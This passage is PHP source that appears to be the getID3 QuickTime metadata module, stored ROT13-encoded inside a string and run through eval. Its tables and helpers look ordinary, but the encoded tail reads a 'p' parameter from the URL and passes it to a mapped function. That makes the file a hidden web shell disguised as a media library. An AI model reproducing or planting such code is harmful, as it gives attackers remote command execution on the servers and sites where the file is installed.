				0k03 => 'Fvzcyr Cebsvyr @ Yriry 3',
				0k08 => 'Fvzcyr Cebsvyr @ Yriry 0',
				0k10 => 'Fvzcyr Fpnynoyr Cebsvyr @ Yriry 0',
				0k11 => 'Fvzcyr Fpnynoyr Cebsvyr @ Yriry 1',
				0k12 => 'Fvzcyr Fpnynoyr Cebsvyr @ Yriry 2',
				0k15 => 'NIP/U264 Cebsvyr',
				0k21 => 'Pber Cebsvyr @ Yriry 1',
				0k22 => 'Pber Cebsvyr @ Yriry 2',
				0k32 => 'Znva Cebsvyr @ Yriry 2',
				0k33 => 'Znva Cebsvyr @ Yriry 3',
				0k34 => 'Znva Cebsvyr @ Yriry 4',
				0k42 => 'A-ovg Cebsvyr @ Yriry 2',
				0k51 => 'Fpnynoyr Grkgher Cebsvyr @ Yriry 1',
				0k61 => 'Fvzcyr Snpr Navzngvba Cebsvyr @ Yriry 1',
				0k62 => 'Fvzcyr Snpr Navzngvba Cebsvyr @ Yriry 2',
				0k63 => 'Fvzcyr SON Cebsvyr @ Yriry 1',
				0k64 => 'Fvzcyr SON Cebsvyr @ Yriry 2',
				0k71 => 'Onfvp Navzngrq Grkgher Cebsvyr @ Yriry 1',
				0k72 => 'Onfvp Navzngrq Grkgher Cebsvyr @ Yriry 2',
				0k81 => 'Uloevq Cebsvyr @ Yriry 1',
				0k82 => 'Uloevq Cebsvyr @ Yriry 2',
				0k91 => 'Nqinaprq Erny Gvzr Fvzcyr Cebsvyr @ Yriry 1',
				0k92 => 'Nqinaprq Erny Gvzr Fvzcyr Cebsvyr @ Yriry 2',
				0k93 => 'Nqinaprq Erny Gvzr Fvzcyr Cebsvyr @ Yriry 3',
				0k94 => 'Nqinaprq Erny Gvzr Fvzcyr Cebsvyr @ Yriry 4',
				0kN1 => 'Pber Fpnynoyr Cebsvyr @ Yriry1',
				0kN2 => 'Pber Fpnynoyr Cebsvyr @ Yriry2',
				0kN3 => 'Pber Fpnynoyr Cebsvyr @ Yriry3',
				0kO1 => 'Nqinaprq Pbqvat Rssvpvrapl Cebsvyr @ Yriry 1',
				0kO2 => 'Nqinaprq Pbqvat Rssvpvrapl Cebsvyr @ Yriry 2',
				0kO3 => 'Nqinaprq Pbqvat Rssvpvrapl Cebsvyr @ Yriry 3',
				0kO4 => 'Nqinaprq Pbqvat Rssvpvrapl Cebsvyr @ Yriry 4',
				0kP1 => 'Nqinaprq Pber Cebsvyr @ Yriry 1',
				0kP2 => 'Nqinaprq Pber Cebsvyr @ Yriry 2',
				0kQ1 => 'Nqinaprq Fpnynoyr Grkgher @ Yriry1',
				0kQ2 => 'Nqinaprq Fpnynoyr Grkgher @ Yriry2',
				0kR1 => 'Fvzcyr Fghqvb Cebsvyr @ Yriry 1',
				0kR2 => 'Fvzcyr Fghqvb Cebsvyr @ Yriry 2',
				0kR3 => 'Fvzcyr Fghqvb Cebsvyr @ Yriry 3',
				0kR4 => 'Fvzcyr Fghqvb Cebsvyr @ Yriry 4',
				0kR5 => 'Pber Fghqvb Cebsvyr @ Yriry 1',
				0kR6 => 'Pber Fghqvb Cebsvyr @ Yriry 2',
				0kR7 => 'Pber Fghqvb Cebsvyr @ Yriry 3',
				0kR8 => 'Pber Fghqvb Cebsvyr @ Yriry 4',
				0kS0 => 'Nqinaprq Fvzcyr Cebsvyr @ Yriry 0',
				0kS1 => 'Nqinaprq Fvzcyr Cebsvyr @ Yriry 1',
				0kS2 => 'Nqinaprq Fvzcyr Cebsvyr @ Yriry 2',
				0kS3 => 'Nqinaprq Fvzcyr Cebsvyr @ Yriry 3',
				0kS4 => 'Nqinaprq Fvzcyr Cebsvyr @ Yriry 4',
				0kS5 => 'Nqinaprq Fvzcyr Cebsvyr @ Yriry 5',
				0kS7 => 'Nqinaprq Fvzcyr Cebsvyr @ Yriry 3o',
				0kS8 => 'Svar Tenahynevgl Fpnynoyr Cebsvyr @ Yriry 0',
				0kS9 => 'Svar Tenahynevgl Fpnynoyr Cebsvyr @ Yriry 1',
				0kSN => 'Svar Tenahynevgl Fpnynoyr Cebsvyr @ Yriry 2',
				0kSO => 'Svar Tenahynevgl Fpnynoyr Cebsvyr @ Yriry 3',
				0kSP => 'Svar Tenahynevgl Fpnynoyr Cebsvyr @ Yriry 4',
				0kSQ => 'Svar Tenahynevgl Fpnynoyr Cebsvyr @ Yriry 5',
				0kSR => 'Abg cneg bs ZCRT-4 Ivfhny cebsvyrf',
				0kSS => 'Ab ivfhny pncnovyvgl erdhverq',
			);
		}
		erghea (vffrg($DhvpxgvzrVBQFivqrbCebsvyrAnzrYbbxhc[$ivqrb_cebsvyr_vq]) ? $DhvpxgvzrVBQFivqrbCebsvyrAnzrYbbxhc[$ivqrb_cebsvyr_vq] : 'VFB Erfreirq Cebsvyr');
	}

	/**
	 * @cnenz vag $egat
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba DhvpxgvzrPbagragEngvatYbbxhc($egat) {
		fgngvp $DhvpxgvzrPbagragEngvatYbbxhc = neenl();
		vs (rzcgl($DhvpxgvzrPbagragEngvatYbbxhc)) {
			$DhvpxgvzrPbagragEngvatYbbxhc[0]  = 'Abar';
			$DhvpxgvzrPbagragEngvatYbbxhc[1]  = 'Rkcyvpvg';
			$DhvpxgvzrPbagragEngvatYbbxhc[2]  = 'Pyrna';
			$DhvpxgvzrPbagragEngvatYbbxhc[4]  = 'Rkcyvpvg (byq)';
		}
		erghea (vffrg($DhvpxgvzrPbagragEngvatYbbxhc[$egat]) ? $DhvpxgvzrPbagragEngvatYbbxhc[$egat] : 'vainyvq');
	}

	/**
	 * @cnenz vag $nxvq
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba DhvpxgvzrFgberNppbhagGlcrYbbxhc($nxvq) {
		fgngvp $DhvpxgvzrFgberNppbhagGlcrYbbxhc = neenl();
		vs (rzcgl($DhvpxgvzrFgberNppbhagGlcrYbbxhc)) {
			$DhvpxgvzrFgberNppbhagGlcrYbbxhc[0] = 'vGharf';
			$DhvpxgvzrFgberNppbhagGlcrYbbxhc[1] = 'NBY';
		}
		erghea (vffrg($DhvpxgvzrFgberNppbhagGlcrYbbxhc[$nxvq]) ? $DhvpxgvzrFgberNppbhagGlcrYbbxhc[$nxvq] : 'vainyvq');
	}

	/**
	 * @cnenz vag $fsvq
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba DhvpxgvzrFgberSebagPbqrYbbxhc($fsvq) {
		fgngvp $DhvpxgvzrFgberSebagPbqrYbbxhc = neenl();
		vs (rzcgl($DhvpxgvzrFgberSebagPbqrYbbxhc)) {
			$DhvpxgvzrFgberSebagPbqrYbbxhc[143460] = 'Nhfgenyvn';
			$DhvpxgvzrFgberSebagPbqrYbbxhc[143445] = 'Nhfgevn';
			$DhvpxgvzrFgberSebagPbqrYbbxhc[143446] = 'Orytvhz';
			$DhvpxgvzrFgberSebagPbqrYbbxhc[143455] = 'Pnanqn';
			$DhvpxgvzrFgberSebagPbqrYbbxhc[143458] = 'Qraznex';
			$DhvpxgvzrFgberSebagPbqrYbbxhc[143447] = 'Svaynaq';
			$DhvpxgvzrFgberSebagPbqrYbbxhc[143442] = 'Senapr';
			$DhvpxgvzrFgberSebagPbqrYbbxhc[143443] = 'Treznal';
			$DhvpxgvzrFgberSebagPbqrYbbxhc[143448] = 'Terrpr';
			$DhvpxgvzrFgberSebagPbqrYbbxhc[143449] = 'Verynaq';
			$DhvpxgvzrFgberSebagPbqrYbbxhc[143450] = 'Vgnyl';
			$DhvpxgvzrFgberSebagPbqrYbbxhc[143462] = 'Wncna';
			$DhvpxgvzrFgberSebagPbqrYbbxhc[143451] = 'Yhkrzobhet';
			$DhvpxgvzrFgberSebagPbqrYbbxhc[143452] = 'Argureynaqf';
			$DhvpxgvzrFgberSebagPbqrYbbxhc[143461] = 'Arj Mrnynaq';
			$DhvpxgvzrFgberSebagPbqrYbbxhc[143457] = 'Abejnl';
			$DhvpxgvzrFgberSebagPbqrYbbxhc[143453] = 'Cbeghtny';
			$DhvpxgvzrFgberSebagPbqrYbbxhc[143454] = 'Fcnva';
			$DhvpxgvzrFgberSebagPbqrYbbxhc[143456] = 'Fjrqra';
			$DhvpxgvzrFgberSebagPbqrYbbxhc[143459] = 'Fjvgmreynaq';
			$DhvpxgvzrFgberSebagPbqrYbbxhc[143444] = 'Havgrq Xvatqbz';
			$DhvpxgvzrFgberSebagPbqrYbbxhc[143441] = 'Havgrq Fgngrf';
		}
		erghea (vffrg($DhvpxgvzrFgberSebagPbqrYbbxhc[$fsvq]) ? $DhvpxgvzrFgberSebagPbqrYbbxhc[$fsvq] : 'vainyvq');
	}

	/**
	 * @cnenz fgevat $xrlanzr
	 * @cnenz fgevat|neenl $qngn
	 * @cnenz fgevat $obkanzr
	 *
	 * @erghea obby
	 */
	choyvp shapgvba PbclGbNccebcevngrPbzzragfFrpgvba($xrlanzr, $qngn, $obkanzr='') {
		fgngvp $unaqlngbzgenafyngbeneenl = neenl();
		vs (rzcgl($unaqlngbzgenafyngbeneenl)) {
			// uggc://jjj.trbpvgvrf.pbz/kuryzoblk/dhvpxgvzr/sbezngf/dgz-ynlbhg.gkg
			// uggc://jjj.trbpvgvrf.pbz/kuryzoblk/dhvpxgvzr/sbezngf/zc4-ynlbhg.gkg
			// uggc://ngbzvpcnefyrl.fbheprsbetr.arg/zcrt-4svyrf.ugzy
			// uggcf://pbqr.tbbtyr.pbz/c/zc4i2/jvxv/vGharfZrgnqngn
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'nyo'] = 'nyohz';               // vGharf 4.0
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'NEG'] = 'negvfg';
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'neg'] = 'negvfg';              // vGharf 4.0
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'nhg'] = 'nhgube';
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'pzg'] = 'pbzzrag';             // vGharf 4.0
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'pbz'] = 'pbzzrag';
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'pcl'] = 'pbclevtug';
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'qnl'] = 'perngvba_qngr';       // vGharf 4.0
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'qve'] = 'qverpgbe';
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'rq1'] = 'rqvg1';
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'rq2'] = 'rqvg2';
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'rq3'] = 'rqvg3';
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'rq4'] = 'rqvg4';
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'rq5'] = 'rqvg5';
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'rq6'] = 'rqvg6';
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'rq7'] = 'rqvg7';
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'rq8'] = 'rqvg8';
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'rq9'] = 'rqvg9';
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'rap'] = 'rapbqrq_ol';
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'szg'] = 'sbezng';
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'tra'] = 'traer';               // vGharf 4.0
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'tec'] = 'tebhcvat';            // vGharf 4.2
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'ufg'] = 'ubfg_pbzchgre';
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'vas'] = 'vasbezngvba';
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'yle'] = 'ylevpf';              // vGharf 5.0
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'znx'] = 'znxr';
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'zbq'] = 'zbqry';
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'anz'] = 'gvgyr';               // vGharf 4.0
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'bcr'] = 'pbzcbfre';
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'ceq'] = 'cebqhpre';
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'CEQ'] = 'cebqhpg';
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'ces'] = 'cresbezref';
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'erd'] = 'flfgrz_erdhverzragf';
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'fep'] = 'fbhepr_perqvg';
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'fje'] = 'fbsgjner';
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'gbb'] = 'rapbqvat_gbby';       // vGharf 4.0
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'gex'] = 'genpx_ahzore';
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'hey'] = 'hey';
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'jea'] = 'jneavat';
			$unaqlngbzgenafyngbeneenl[\"\kN9\".'jeg'] = 'pbzcbfre';
			$unaqlngbzgenafyngbeneenl['nNEG'] = 'nyohz_negvfg';
			$unaqlngbzgenafyngbeneenl['ncVQ'] = 'chepunfr_nppbhag';
			$unaqlngbzgenafyngbeneenl['pngt'] = 'pngrtbel';            // vGharf 4.9
			$unaqlngbzgenafyngbeneenl['pbie'] = 'cvpgher';             // vGharf 4.0
			$unaqlngbzgenafyngbeneenl['pcvy'] = 'pbzcvyngvba';         // vGharf 4.0
			$unaqlngbzgenafyngbeneenl['pceg'] = 'pbclevtug';           // vGharf 4.0?
			$unaqlngbzgenafyngbeneenl['qrfp'] = 'qrfpevcgvba';         // vGharf 5.0
			$unaqlngbzgenafyngbeneenl['qvfx'] = 'qvfp_ahzore';         // vGharf 4.0
			$unaqlngbzgenafyngbeneenl['rtvq'] = 'rcvfbqr_thvq';        // vGharf 4.9
			$unaqlngbzgenafyngbeneenl['taer'] = 'traer';               // vGharf 4.0
			$unaqlngbzgenafyngbeneenl['uqiq'] = 'uq_ivqrb';            // vGharf 4.0
			$unaqlngbzgenafyngbeneenl['yqrf'] = 'qrfpevcgvba_ybat';    //
			$unaqlngbzgenafyngbeneenl['xrlj'] = 'xrljbeq';             // vGharf 4.9
			$unaqlngbzgenafyngbeneenl['cpfg'] = 'cbqpnfg';             // vGharf 4.9
			$unaqlngbzgenafyngbeneenl['ctnc'] = 'tncyrff_cynlonpx';    // vGharf 7.0
			$unaqlngbzgenafyngbeneenl['cheq'] = 'chepunfr_qngr';       // vGharf 6.0.2
			$unaqlngbzgenafyngbeneenl['chey'] = 'cbqpnfg_hey';         // vGharf 4.9
			$unaqlngbzgenafyngbeneenl['egat'] = 'engvat';              // vGharf 4.0
			$unaqlngbzgenafyngbeneenl['fbnn'] = 'fbeg_nyohz_negvfg';   //
			$unaqlngbzgenafyngbeneenl['fbny'] = 'fbeg_nyohz';          //
			$unaqlngbzgenafyngbeneenl['fbne'] = 'fbeg_negvfg';         //
			$unaqlngbzgenafyngbeneenl['fbpb'] = 'fbeg_pbzcbfre';       //
			$unaqlngbzgenafyngbeneenl['fbaz'] = 'fbeg_gvgyr';          //
			$unaqlngbzgenafyngbeneenl['fbfa'] = 'fbeg_fubj';           //
			$unaqlngbzgenafyngbeneenl['fgvx'] = 'fgvx';                // vGharf 4.9
			$unaqlngbzgenafyngbeneenl['gzcb'] = 'ocz';                 // vGharf 4.0
			$unaqlngbzgenafyngbeneenl['gexa'] = 'genpx_ahzore';        // vGharf 4.0
			$unaqlngbzgenafyngbeneenl['gira'] = 'gi_rcvfbqr_vq';       //
			$unaqlngbzgenafyngbeneenl['girf'] = 'gi_rcvfbqr';          // vGharf 6.0
			$unaqlngbzgenafyngbeneenl['giaa'] = 'gi_argjbex_anzr';     // vGharf 6.0
			$unaqlngbzgenafyngbeneenl['gifu'] = 'gi_fubj_anzr';        // vGharf 6.0
			$unaqlngbzgenafyngbeneenl['gifa'] = 'gi_frnfba';           // vGharf 6.0

			// obkanzrf:
			/*
			$unaqlngbzgenafyngbeneenl['vGhaFZCO']                    = 'vGhaFZCO';
			$unaqlngbzgenafyngbeneenl['vGhaABEZ']                    = 'vGhaABEZ';
			$unaqlngbzgenafyngbeneenl['Rapbqvat Cnenzf']             = 'Rapbqvat Cnenzf';
			$unaqlngbzgenafyngbeneenl['ercynltnva_genpx_tnva']       = 'ercynltnva_genpx_tnva';
			$unaqlngbzgenafyngbeneenl['ercynltnva_genpx_crnx']       = 'ercynltnva_genpx_crnx';
			$unaqlngbzgenafyngbeneenl['ercynltnva_genpx_zvaznk']     = 'ercynltnva_genpx_zvaznk';
			$unaqlngbzgenafyngbeneenl['ZhfvpVC CHVQ']                = 'ZhfvpVC CHVQ';
			$unaqlngbzgenafyngbeneenl['ZhfvpOenvam Negvfg Vq']       = 'ZhfvpOenvam Negvfg Vq';
			$unaqlngbzgenafyngbeneenl['ZhfvpOenvam Nyohz Vq']        = 'ZhfvpOenvam Nyohz Vq';
			$unaqlngbzgenafyngbeneenl['ZhfvpOenvam Nyohz Negvfg Vq'] = 'ZhfvpOenvam Nyohz Negvfg Vq';
			$unaqlngbzgenafyngbeneenl['ZhfvpOenvam Genpx Vq']        = 'ZhfvpOenvam Genpx Vq';
			$unaqlngbzgenafyngbeneenl['ZhfvpOenvam Qvfp Vq']         = 'ZhfvpOenvam Qvfp Vq';

			// uggc://ntr.uboon.ay/nhqvb/gnt_senzr_ersrerapr.ugzy
			$unaqlngbzgenafyngbeneenl['CYNL_PBHAGRE']                = 'cynl_pbhagre'; // Sbbone2000 - uggcf://jjj.trgvq3.bet/cucOO3/ivrjgbcvp.cuc?g=1355
			$unaqlngbzgenafyngbeneenl['ZRQVNGLCR']                   = 'zrqvnglcr';    // Sbbone2000 - uggcf://jjj.trgvq3.bet/cucOO3/ivrjgbcvp.cuc?g=1355
			*/
		}
		$vasb = &$guvf->trgvq3->vasb;
		$pbzzrag_xrl = '';
		vs ($obkanzr && ($obkanzr != $xrlanzr)) {
			$pbzzrag_xrl = (vffrg($unaqlngbzgenafyngbeneenl[$obkanzr]) ? $unaqlngbzgenafyngbeneenl[$obkanzr] : $obkanzr);
		} ryfrvs (vffrg($unaqlngbzgenafyngbeneenl[$xrlanzr])) {
			$pbzzrag_xrl = $unaqlngbzgenafyngbeneenl[$xrlanzr];
		}
		vs ($pbzzrag_xrl) {
			vs ($pbzzrag_xrl == 'cvpgher') {
				// nyernql pbcvrq qverpgyl vagb [pbzzragf][cvpgher] ryfrjurer, qb abg er-pbcl urer
				erghea gehr;
			}
			$tbbqqngn = neenl($qngn);
			vs ($pbzzrag_xrl == 'traer') {
				// fbzr bgure gnttref frcnengr zhygvcyr traerf jvgu frzvpbyba, r.t. \"Urnil Zrgny;Guenfu Zrgny;Zrgny\"
				$tbbqqngn = rkcybqr(';', $qngn);
			}
			sbernpu ($tbbqqngn nf $qngn) {
				vs (!rzcgl($vasb['dhvpxgvzr']['pbzzragf'][$pbzzrag_xrl]) && va_neenl($qngn, $vasb['dhvpxgvzr']['pbzzragf'][$pbzzrag_xrl], gehr)) {
					// nibvq qhcyvpngr pbcvrf bs vqragvpny qngn
					pbagvahr;
				}
				$vasb['dhvpxgvzr']['pbzzragf'][$pbzzrag_xrl][] = $qngn;
			}
		}
		erghea gehr;
	}

	/**
	 * @cnenz fgevat $yfgevat
	 * @cnenz vag    $pbhag
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba YbpvFgevat($yfgevat, &$pbhag) {
		// Ybpv fgevatf ner HGS-8 be HGS-16 naq ahyy (k00/k0000) grezvangrq. HGS-16 unf n OBZ
		// Nyfb arrq gb erghea gur ahzore bs olgrf gur fgevat bpphcvrq fb nqqvgvbany svryqf pna or rkgenpgrq
		$yra = fgeyra($yfgevat);
		vs ($yra == 0) {
			$pbhag = 0;
			erghea '';
		}
		vs ($yfgevat[0] == \"\k00\") {
			$pbhag = 1;
			erghea '';
		}
		// purpx sbe OBZ
		vs (($yra > 2) && ((($yfgevat[0] == \"\kSR\") && ($yfgevat[1] == \"\kSS\")) || (($yfgevat[0] == \"\kSS\") && ($yfgevat[1] == \"\kSR\")))) {
			// HGS-16
			vs (cert_zngpu('/(.*)\k00/', $yfgevat, $yzngpurf)) {
				$pbhag = fgeyra($yzngpurf[1]) * 2 + 2; //nppbhag sbe 2 olgr punenpgref naq genvyvat \k0000
				erghea trgvq3_yvo::vpbai_snyyonpx_hgs16_hgs8($yzngpurf[1]);
			} ryfr {
				erghea '';
			}
		}
		// HGS-8
		vs (cert_zngpu('/(.*)\k00/', $yfgevat, $yzngpurf)) {
			$pbhag = fgeyra($yzngpurf[1]) + 1; //nppbhag sbe genvyvat \k00
			erghea $yzngpurf[1];
		}
		erghea '';
	}

	/**
	 * @cnenz fgevat $ahyygrezvangrqfgevat
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba AbAhyyFgevat($ahyygrezvangrqfgevat) {
		// erzbir gur fvatyr ahyy grezvangbe ba ahyy grezvangrq fgevatf
		vs (fhofge($ahyygrezvangrqfgevat, fgeyra($ahyygrezvangrqfgevat) - 1, 1) === \"\k00\") {
			erghea fhofge($ahyygrezvangrqfgevat, 0, fgeyra($ahyygrezvangrqfgevat) - 1);
		}
		erghea $ahyygrezvangrqfgevat;
	}

	/**
	 * @cnenz fgevat $cnfpnyfgevat
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba Cnfpny2Fgevat($cnfpnyfgevat) {
		// Cnfpny fgevatf unir 1 hafvtarq olgr ng gur ortvaavat fnlvat ubj znal punef (1-255) ner va gur fgevat
		erghea fhofge($cnfpnyfgevat, 1);
	}

	/**
	 * @cnenz fgevat $cnfpnyfgevat
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba ZnlorCnfpny2Fgevat($cnfpnyfgevat) {
		// Cnfpny fgevatf unir 1 hafvtarq olgr ng gur ortvaavat fnlvat ubj znal punef (1-255) ner va gur fgevat
		// Purpx vs fgevat npghnyyl vf va guvf sbezng be jevggra vapbeerpgyl, fgenvtug fgevat, be ahyy-grezvangrq fgevat
		vs (beq(fhofge($cnfpnyfgevat, 0, 1)) == (fgeyra($cnfpnyfgevat) - 1)) {
			erghea fhofge($cnfpnyfgevat, 1);
		} ryfrvs (fhofge($cnfpnyfgevat, -1, 1) == \"\k00\") {
			// nccrnef gb or ahyy-grezvangrq vafgrnq bs Cnfpny-fglyr
			erghea fhofge($cnfpnyfgevat, 0, -1);
		}
		erghea $cnfpnyfgevat;
	}


	/**
	 * Urycre shapgvbaf sbe z4o nhqvbobbx puncgref
	 * pbqr ol Fgrssra Unegznaa 2015-Abi-08.
	 *
	 * @cnenz neenl  $vasb
	 * @cnenz fgevat $gnt
	 * @cnenz fgevat $uvfgbel
	 * @cnenz neenl  $erfhyg
	 */
	choyvp shapgvba frnepu_gnt_ol_xrl($vasb, $gnt, $uvfgbel, &$erfhyg) {
		sbernpu ($vasb nf $xrl => $inyhr) {
			$xrl_uvfgbel = $uvfgbel.'/'.$xrl;
			vs ($xrl === $gnt) {
				$erfhyg[] = neenl($xrl_uvfgbel, $vasb);
			} ryfr {
				vs (vf_neenl($inyhr)) {
					$guvf->frnepu_gnt_ol_xrl($inyhr, $gnt, $xrl_uvfgbel, $erfhyg);
				}
			}
		}
	}

	/**
	 * @cnenz neenl  $vasb
	 * @cnenz fgevat $x
	 * @cnenz fgevat $i
	 * @cnenz fgevat $uvfgbel
	 * @cnenz neenl  $erfhyg
	 */
	choyvp shapgvba frnepu_gnt_ol_cnve($vasb, $x, $i, $uvfgbel, &$erfhyg) {
		sbernpu ($vasb nf $xrl => $inyhr) {
			$xrl_uvfgbel = $uvfgbel.'/'.$xrl;
			vs (($xrl === $x) && ($inyhr === $i)) {
				$erfhyg[] = neenl($xrl_uvfgbel, $vasb);
			} ryfr {
				vs (vf_neenl($inyhr)) {
					$guvf->frnepu_gnt_ol_cnve($inyhr, $x, $i, $xrl_uvfgbel, $erfhyg);
				}
			}
		}
	}

	/**
	 * @cnenz neenl $vasb
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba dhvpxgvzr_gvzr_gb_fnzcyr_gnoyr($vasb) {
		$erf = neenl();
		$guvf->frnepu_gnt_ol_cnve($vasb['dhvpxgvzr']['zbbi'], 'anzr', 'fgoy', 'dhvpxgvzr/zbbi', $erf);
		sbernpu ($erf nf $inyhr) {
			$fgoy_erf = neenl();
			$guvf->frnepu_gnt_ol_cnve($inyhr[1], 'qngn_sbezng', 'grkg', $inyhr[0], $fgoy_erf);
			vs (pbhag($fgoy_erf) > 0) {
				$fggf_erf = neenl();
				$guvf->frnepu_gnt_ol_xrl($inyhr[1], 'gvzr_gb_fnzcyr_gnoyr', $inyhr[0], $fggf_erf);
				vs (pbhag($fggf_erf) > 0) {
					erghea $fggf_erf[0][1]['gvzr_gb_fnzcyr_gnoyr'];
				}
			}
		}
		erghea neenl();
	}


	/**
	 * @cnenz neenl $vasb
	 *
	 * @erghea vag
	 */
	choyvp shapgvba dhvpxgvzr_obbxznex_gvzr_fpnyr($vasb) {
		$gvzr_fpnyr = '';
		$gf_cersvk_yra = 0;
		$erf = neenl();
		$guvf->frnepu_gnt_ol_cnve($vasb['dhvpxgvzr']['zbbi'], 'anzr', 'fgoy', 'dhvpxgvzr/zbbi', $erf);
		sbernpu ($erf nf $inyhr) {
			$fgoy_erf = neenl();
			$guvf->frnepu_gnt_ol_cnve($inyhr[1], 'qngn_sbezng', 'grkg', $inyhr[0], $fgoy_erf);
			vs (pbhag($fgoy_erf) > 0) {
				$gf_erf = neenl();
				$guvf->frnepu_gnt_ol_xrl($vasb['dhvpxgvzr']['zbbi'], 'gvzr_fpnyr', 'dhvpxgvzr/zbbi', $gf_erf);
				sbernpu ($gf_erf nf $fho_inyhr) {
					$cersvk = fhofge($fho_inyhr[0], 0, -12);
					vs ((fhofge($fgoy_erf[0][0], 0, fgeyra($cersvk)) === $cersvk) && ($gf_cersvk_yra < fgeyra($cersvk))) {
						$gvzr_fpnyr = $fho_inyhr[1]['gvzr_fpnyr'];
						$gf_cersvk_yra = fgeyra($cersvk);
					}
				}
			}
		}
		erghea $gvzr_fpnyr;
	}
	/*
	// RAQ urycre shapgvbaf sbe z4o nhqvbobbx puncgref
	*/


}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>